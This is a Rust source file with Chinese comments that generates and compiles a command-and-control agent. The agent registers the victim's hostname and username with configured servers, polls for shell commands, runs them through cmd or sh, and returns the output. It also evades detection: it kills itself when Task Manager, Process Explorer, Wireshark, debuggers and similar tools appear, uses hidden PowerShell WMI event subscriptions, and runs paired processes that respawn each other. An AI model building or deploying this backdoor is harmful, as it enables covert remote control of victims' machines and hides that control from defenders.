//! C2 Agent 二进制生成器
//!
//! 接收 C2 服务器地址列表，生成一个独立的 agent 二进制。
//! Agent 连接到 C2 服务器，上报系统信息，轮询命令并执行。

use std::fs;
use std::path::PathBuf;
use std::process::Command;

/// Agent 源文件模板 — 编译后是一个独立的 C2 客户端。
///
/// 内置三种反检测/隐匿机制：
///   方案A: 看门狗线程 — 轮询进程列表，检测到 taskmgr/ProcessHacker 等立即自杀
///   方案B: WMI 事件订阅 — Windows 下订阅 __InstanceCreationEvent，新进程创建即触发
///   方案C: 双进程互相监控 — `--watchdog` 模式互拉活，检测到工具时双双撤退
const AGENT_SOURCE: &str = r###"// C2 Agent — 自动生成，请勿手动编辑
// 编译: rustc -C opt-level=3 -C target-feature=+crt-static --edition 2021 <this_file> -o c2-agent
// 或: cd target/c2-agent && cargo build --release

use std::process::{Command, Stdio};
use std::time::Duration;
use std::io::Read;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;

const SERVERS: &[&str] = &[SERVERS_PLACEHOLDER];
const POLL_INTERVAL_SECS: u64 = 30;

// ═══════════════════════════════════════════════════════════════
// 方案A: 看门狗线程 — 监控工具黑名单
// ═══════════════════════════════════════════════════════════════
const MONITORED_TOOLS: &[&str] = &[
    "taskmgr.exe",           // 任务管理器
    "procexp.exe",           // Process Explorer
    "procexp64.exe",         // Process Explorer 64
    "processhacker.exe",     // Process Hacker
    "processhacker64.exe",   // Process Hacker 64
    "procmon.exe",           // Process Monitor
    "procmon64.exe",
    "perfmon.exe",           // 性能监视器
    "resmon.exe",            // 资源监视器
    "x64dbg.exe",            // x64dbg 调试器
    "x32dbg.exe",
    "ida64.exe",             // IDA Pro
    "ollydbg.exe",           // OllyDbg
    "wireshark.exe",         // Wireshark
    "tcpview.exe",           // TCPView
    "tcpview64.exe",
    "dbgview.exe",           // DebugView
    "dbgview64.exe",
    "pchunter.exe",          // PCHunter
    "pchunter64.exe",
    "autoruns.exe",          // Autoruns
    "autoruns64.exe",
    "handle.exe",            // Handle
    "handle64.exe",
    "vmmap.exe",             // VMMap
    "vmmap64.exe",
    "rammap.exe",            // RAMMap
    "rammap64.exe",
    "shell.exe",             // 可疑 shell
    "cmd.exe",               // cmd.exe 本身（由方案B负责，不在此列）
];

/// 检测当前系统中是否存在监控工具
fn detect_monitoring_tools() -> Vec<String> {
    let mut found = Vec::new();
    let output = if cfg!(target_os = "windows") {
        Command::new("tasklist")
            .args(["/FO", "CSV", "/NH"])
            .output()
    } else {
        Command::new("ps")
            .args(["-eo", "comm"])
            .output()
    };

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        for tool in MONITORED_TOOLS {
            let t = tool.to_lowercase();
            if text.contains(&t) {
                found.push(tool.to_string());
            }
        }
    }
    found
}

/// 方案A: 看门狗线程 — 每 3 秒扫一次进程列表
fn start_watchdog_a(should_exit: Arc<AtomicBool>) {
    thread::spawn(move || {
        loop {
            let found = detect_monitoring_tools();
            if !found.is_empty() {
                eprintln!("[c2-agent] ⚠  Detected monitoring tools: {:?}", found);
                should_exit.store(true, Ordering::SeqCst);
                // 给方案C的兄弟进程一点时间同步退出
                thread::sleep(Duration::from_secs(1));
                std::process::exit(0);
            }
            thread::sleep(Duration::from_secs(3));
        }
    });
}

// ═══════════════════════════════════════════════════════════════
// 方案B: WMI 事件订阅 — Windows 实时进程创建监控
// ═══════════════════════════════════════════════════════════════

/// WMI 查询字符串 — 订阅新进程创建事件，过滤监控工具名
fn wmi_query_for_tool(tool: &str) -> String {
    format!(
        "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '{}'",
        tool
    )
}

/// 方案B: 启动 WMI 事件订阅（Windows 仅调用 powershell 注册）
/// 若检测到目标进程创建，立即退出
fn start_watchdog_b(should_exit: Arc<AtomicBool>) {
    if !cfg!(target_os = "windows") {
        return; // 非 Windows 跳过
    }
    thread::spawn(move || {
        for tool in MONITORED_TOOLS {
            let tool = *tool;
            let flag = should_exit.clone();
            thread::spawn(move || {
                let query = wmi_query_for_tool(tool);
                // 用 PowerShell Register-CimIndicationEvent 订阅 WMI 事件
                let ps_script = format!(
                    r#"Register-CimIndicationEvent -Query '{}' -Action {{ Stop-Process -Id {} -Force; Exit }} | Out-Null; while($true){{ Wait-Event; Start-Sleep 1 }}"#,
                    query, std::process::id()
                );
                // 持续运行，事件触发时 PowerShell 会杀本进程
                let _ = Command::new("powershell")
                    .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &ps_script])
                    .status();
                // 如果 PowerShell 进程挂了（被清理），看门狗线程也退出
                flag.store(true, Ordering::SeqCst);
                std::process::exit(0);
            });
        }
    });
}

// ═══════════════════════════════════════════════════════════════
// 方案C: 双进程互相监控 — 互拉活 + 同时撤退
// ═══════════════════════════════════════════════════════════════

/// 当前进程是否是 watchdog 兄弟（由主进程启动）
const WATCHDOG_ARG: &str = "--c2-watchdog";

/// 方案C: 启动兄弟 watchdog 进程，互相监控
///
/// 主进程启动时 spawn 一个兄弟进程（传 `--c2-watchdog` 参数），
/// 兄弟进程监控主进程 PID，主进程监控兄弟进程 PID。
/// 任意一方检测到监控工具（通过方案A的 `should_exit`），双方同时退出。
/// 任意一方意外死亡，另一方复活它。
fn start_watchdog_c(should_exit: Arc<AtomicBool>) {
    let is_watchdog = std::env::args().any(|a| a == WATCHDOG_ARG);

    if is_watchdog {
        // ── 兄弟 watchdog 进程 ──
        // 从环境变量读取主进程 PID
        let parent_pid: u32 = std::env::var("C2_PARENT_PID")
            .ok()
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);

        eprintln!("[c2-watchdog] Started for parent PID={}", parent_pid);

        loop {
            // 检查是否该退出了（方案A/B 触发了 should_exit）
            if should_exit.load(Ordering::SeqCst) {
                eprintln!("[c2-watchdog] Exit signal received, dying.");
                std::process::exit(0);
            }

            // 检查主进程是否还活着
            let parent_alive = if cfg!(target_os = "windows") {
                Command::new("tasklist")
                    .args(["/FI", &format!("PID eq {}", parent_pid), "/NH"])
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).contains(&parent_pid.to_string()))
                    .unwrap_or(false)
            } else {
                Command::new("kill")
                    .args(["-0", &parent_pid.to_string()])
                    .status()
                    .map(|s| s.success())
                    .unwrap_or(false)
            };

            if !parent_alive {
                eprintln!("[c2-watchdog] Parent {} died, respawning...", parent_pid);
                // 重新启动主进程（相同路径，不带 --watchdog）
                let exe = std::env::current_exe().ok();
                if let Some(exe_path) = exe {
                    let args: Vec<String> = std::env::args()
                        .filter(|a| a != WATCHDOG_ARG)
                        .collect();
                    let mut child = Command::new(&exe_path)
                        .args(&args)
                        .stdout(Stdio::null())
                        .stderr(Stdio::null())
                        .spawn();
                    if let Ok(mut c) = child {
                        eprintln!("[c2-watchdog] Respawning as PID={}", c.id());
                        // 更新环境变量，让新 watchdog 知道新主进程 PID
                        std::env::set_var("C2_PARENT_PID", c.id().to_string());
                        // 等待新主进程，然后继续监控
                        let _ = c.wait();
                    }
                }
            }

            // 检查监控工具（方案A 的检测逻辑）
            let found = detect_monitoring_tools();
            if !found.is_empty() {
                eprintln!("[c2-watchdog] ⚠  Detected tools: {:?}, dying with parent.", found);
                should_exit.store(true, Ordering::SeqCst);
                thread::sleep(Duration::from_millis(500));
                std::process::exit(0);
            }

            thread::sleep(Duration::from_secs(5));
        }
    } else {
        // ── 主进程 ──
        // 启动兄弟 watchdog
        let exe = std::env::current_exe().ok();
        if let Some(exe_path) = exe {
            let my_pid = std::process::id();
            let mut args: Vec<String> = std::env::args()
                .filter(|a| a != WATCHDOG_ARG)
                .collect();
            args.push(WATCHDOG_ARG.to_string());

            let child = Command::new(&exe_path)
                .args(&args)
                .env("C2_PARENT_PID", my_pid.to_string())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn();

            if let Ok(mut c) = child {
                let watchdog_pid = c.id();
                eprintln!("[c2-agent] Watchdog sibling started, PID={}", watchdog_pid);

                // 主进程也监控兄弟进程
                let flag = should_exit.clone();
                thread::spawn(move || {
                    loop {
                        if flag.load(Ordering::SeqCst) {
                            return;
                        }
                        let alive = if cfg!(target_os = "windows") {
                            Command::new("tasklist")
                                .args(["/FI", &format!("PID eq {}", watchdog_pid), "/NH"])
                                .output()
                                .map(|o| String::from_utf8_lossy(&o.stdout).contains(&watchdog_pid.to_string()))
                                .unwrap_or(false)
                        } else {
                            Command::new("kill")
                                .args(["-0", &watchdog_pid.to_string()])
                                .status()
                                .map(|s| s.success())
                                .unwrap_or(false)
                        };
                        if !alive {
                            eprintln!("[c2-agent] Watchdog {} died, will be respawned.", watchdog_pid);
                            // 兄弟 watchdog 自己会复活主进程，但兄弟死了，主进程需要重新 spawn
                            // 因为主进程还活着，兄弟 watchdog 会检测到主进程活着就不再 spawn
                            // 但兄弟死了就没人监控主进程了，所以主进程应该重新 spawn 兄弟
                            let new_child = Command::new(&exe_path)
                                .args(&args)
                                .env("C2_PARENT_PID", std::process::id().to_string())
                                .stdout(Stdio::null())
                                .stderr(Stdio::null())
                                .spawn();
                            if let Ok(nc) = new_child {
                                eprintln!("[c2-agent] New watchdog spawned, PID={}", nc.id());
                            }
                            return;
                        }
                        thread::sleep(Duration::from_secs(5));
                    }
                });
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════
// 原有功能
// ═══════════════════════════════════════════════════════════════

#[derive(serde::Serialize, serde::Deserialize)]
struct SystemInfo {
    hostname: String,
    os: String,
    username: String,
    pid: u32,
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Ping {
    client_id: String,
    info: SystemInfo,
}

#[derive(serde::Deserialize)]
struct Task {
    id: Option<String>,
    #[serde(rename = "type")]
    task_type: Option<String>,
    command: Option<String>,
}

#[derive(serde::Serialize)]
struct TaskResult {
    id: String,
    success: bool,
    output: String,
}

fn system_info() -> SystemInfo {
    let hostname = std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    let os = if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        "other"
    }.to_string();
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    SystemInfo { hostname, os, username, pid: std::process::id() }
}

fn exec(cmd: &str) -> (bool, String) {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", cmd]).output()
    } else {
        Command::new("sh").args(["-c", cmd]).output()
    };
    match output {
        Ok(o) => {
            let mut text = String::new();
            text.push_str(&String::from_utf8_lossy(&o.stdout));
            if !o.stderr.is_empty() {
                if !text.is_empty() { text.push_str("\n--- stderr ---\n"); }
                text.push_str(&String::from_utf8_lossy(&o.stderr));
            }
            (o.status.success(), text)
        }
        Err(e) => (false, format!("Failed to execute: {e}")),
    }
}

fn try_connect(server: &str) -> Option<reqwest::blocking::Client> {
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .build().ok()?;
    let info = system_info();
    let ping = Ping {
        client_id: format!("{}@{}", info.username, info.hostname),
        info,
    };
    let url = format!("{}/agent/register", server.trim_end_matches('/'));
    client.post(&url).json(&ping).send().ok()?;
    Some(client)
}

fn poll_task(client: &reqwest::blocking::Client, server: &str, client_id: &str) -> Option<Task> {
    let url = format!("{}/agent/task?client_id={}", server.trim_end_matches('/'), client_id);
    let resp = client.get(&url).send().ok()?;
    let task: Task = resp.json().ok()?;
    task.id.as_ref()?;
    Some(task)
}

fn submit_result(client: &reqwest::blocking::Client, server: &str, result: &TaskResult) {
    let url = format!("{}/agent/result", server.trim_end_matches('/'));
    let _ = client.post(&url).json(result).send();
}

fn main() {
    // ═══════════════════════════════════════════════
    // 初始化反检测
    // ═══════════════════════════════════════════════
    let should_exit = Arc::new(AtomicBool::new(false));

    // 方案C: 双进程互相监控（必须先于方案A/B启动，因为 watchdog 要继承环境变量）
    // 检查是否是 watchdog 兄弟进程
    let is_watchdog = std::env::args().any(|a| a == WATCHDOG_ARG);
    if is_watchdog {
        start_watchdog_c(should_exit);
        // watchdog 进程不会走到这里，它在 start_watchdog_c 里循环
        return;
    }

    // 主进程启动方案C（spawn 兄弟 watchdog）
    start_watchdog_c(should_exit.clone());

    // 方案A: 看门狗线程
    start_watchdog_a(should_exit.clone());

    // 方案B: WMI 事件订阅（Windows 专用）
    if cfg!(target_os = "windows") {
        start_watchdog_b(should_exit.clone());
    }

    // ═══════════════════════════════════════════════
    // 原有逻辑
    // ═══════════════════════════════════════════════
    let servers = SERVERS;
    let info = system_info();
    let client_id = format!("{}@{}", info.username, info.hostname);
    println!("[c2-agent] Starting. Client ID: {client_id}");
    println!("[c2-agent] Servers: {}", servers.join(", "));
    println!("[c2-agent] Anti-detection: A(watchdog) B(WMI) C(dual-process)");

    // 如果 should_exit 被触发，立即退出主循环
    let client = loop {
        if should_exit.load(Ordering::SeqCst) {
            return;
        }
        for srv in servers {
            if let Some(c) = try_connect(srv) {
                println!("[c2-agent] Connected to {srv}");
                break c;
            }
        }
        println!("[c2-agent] No server reachable, retrying in 60s...");
        for _ in 0..60 {
            if should_exit.load(Ordering::SeqCst) { return; }
            std::thread::sleep(Duration::from_secs(1));
        }
    };

    // Main loop: poll for tasks
    loop {
        if should_exit.load(Ordering::SeqCst) {
            eprintln!("[c2-agent] Exit signal received, shutting down.");
            return;
        }
        if let Some(task) = poll_task(&client, servers[0], &client_id) {
            let cmd = task.command.unwrap_or_default();
            println!("[c2-agent] Executing: {cmd}");
            let (success, output) = exec(&cmd);
            let result = TaskResult {
                id: task.id.unwrap_or_default(),
                success,
                output,
            };
            submit_result(&client, servers[0], &result);
        }
        for _ in 0..POLL_INTERVAL_SECS {
            if should_exit.load(Ordering::SeqCst) { return; }
            std::thread::sleep(Duration::from_secs(1));
        }
    }
}
"###;

/// Generate a C2 agent binary for the given server addresses.
pub fn build_agent(servers: &[String]) -> anyhow::Result<PathBuf> {
    let out_dir = PathBuf::from("./target/c2-agent");
    fs::create_dir_all(&out_dir)?;

    // Embed server addresses into the source
    let server_list: Vec<String> = servers.iter()
        .map(|s| format!("\"{}\"", s))
        .collect();
    let source = AGENT_SOURCE.replace("SERVERS_PLACEHOLDER", &server_list.join(", "));

    let source_path = out_dir.join("c2-agent.rs");
    fs::write(&source_path, &source)?;

    // Check if reqwest is available
    let has_reqwest = Command::new("cargo")
        .arg("search")
        .arg("reqwest")
        .arg("--limit")
        .arg("1")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);

    if has_reqwest {
        // Create a minimal Cargo project for the agent
        let cargo_toml = format!(r##"[package]
name = "c2-agent"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = {{ version = "1", features = ["derive"] }}
serde_json = "1"
reqwest = {{ version = "0.12", features = ["blocking", "json"] }}
"##);
        fs::write(out_dir.join("Cargo.toml"), &cargo_toml)?;

        println!("Compiling C2 agent...");
        let status = Command::new("cargo")
            .args(["build", "--release", "--manifest-path", out_dir.join("Cargo.toml").to_str().unwrap()])
            .status()?;

        if status.success() {
            let binary = out_dir.join("target/release/c2-agent");
            if binary.exists() {
                println!("✔ C2 agent built: {}", binary.display());
                return Ok(binary);
            }
        }
        anyhow::bail!("Cargo build failed");
    } else {
        // Fallback: write the source and tell the user how to compile
        println!("✔ C2 agent source written to: {}", source_path.display());
        println!("  Compile with:");
        println!("    rustc -C opt-level=3 --edition 2021 {} -o c2-agent", source_path.display());
        println!("  Or copy the source to a machine with cargo and run:");
        println!("    cd {} && cargo build --release", out_dir.display());
        Ok(source_path)
    }
}